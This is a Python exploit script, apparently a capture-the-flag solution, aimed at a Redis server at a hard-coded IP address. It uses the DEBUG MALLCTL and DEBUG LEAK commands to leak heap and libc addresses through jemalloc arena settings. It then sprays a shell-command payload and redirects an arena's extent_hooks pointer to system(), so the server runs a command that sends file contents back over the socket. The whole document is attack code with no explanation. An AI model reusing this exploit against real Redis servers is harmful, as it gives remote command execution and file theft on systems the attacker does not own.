import redis
from pwn import *

# IP = "127.0.0.1"
# PORT = "6379"
IP = "47.88.50.1"
PORT = "39165"
client = redis.Redis(IP, PORT)

def run(s):
    print(f"> {s}")
    try:
        result = client.execute_command(s)
        time.sleep(0.1)
    except Exception as e:
        print(f"{e}")
        return None
    if isinstance(result, int):
        print(f"{hex(result)}")
    else:
        print(f"{result}")
    return result

def read_shit(addr):
    tmp_arena = run("DEBUG MALLCTL arenas.create")
    run(f"DEBUG MALLCTL arena.{tmp_arena}.extent_hooks {addr}")
    return u64(run(f"DEBUG MALLCTL-STR arena.{tmp_arena}.extent_hooks").ljust(8, b"\x00"))

arena = run("DEBUG MALLCTL arenas.create")
heap_leak = run(f"DEBUG MALLCTL arena.{arena}.dss")
run(f"DEBUG MALLCTL-STR arena.{arena}.dss")
lib_leak = run(f"DEBUG MALLCTL arena.{arena}.extent_hooks")
run(f"DEBUG MALLCTL-STR arena.{arena}.dss primary")
run(f"DEBUG MALLCTL thread.arena {arena}")

mmap_leak_addr = lib_leak + 0x3810 # got in jemalloc
libc_leak = read_shit(mmap_leak_addr)
print(hex(libc_leak))
system_addr = libc_leak + (0x50d60 - 0x11ebc0)

s = b"/r*>&7\0".ljust(8, b"\x00")
print(len(s))
print(f"[+] system: {hex(system_addr)}")

run(b"DEBUG LEAK 00000"+(s + p64(system_addr) + p64(0) * 7))
run(b"DEBUG LEAK 00000"+(s + p64(system_addr) + p64(0) * 7))
run(b"DEBUG LEAK 00000"+(s + p64(system_addr) + p64(0) * 7))
run(b"DEBUG LEAK 00000"+(s + p64(system_addr) + p64(0) * 7))
run(f"DEBUG MALLCTL stats.active")
# 0x163000 was success

# Leak libc

target = (0x7f5253436708 - 0x7f52543d8a00) + lib_leak
print(hex(target))
for off in [0]:
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    run(f"DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    client2 = redis.Redis(IP, PORT)
    client2.execute_command("PING")
    client3 = redis.Redis(IP, PORT)
    client3.execute_command("PING")
    run(f"DEBUG MALLCTL arena.{arena}.extent_hooks {target+0x100000*off}")
    while True:
        b = client.connection_pool.get_connection("name")._sock.recv(128)
        if len(b) != 0:
            print(b)
    time.sleep(5)

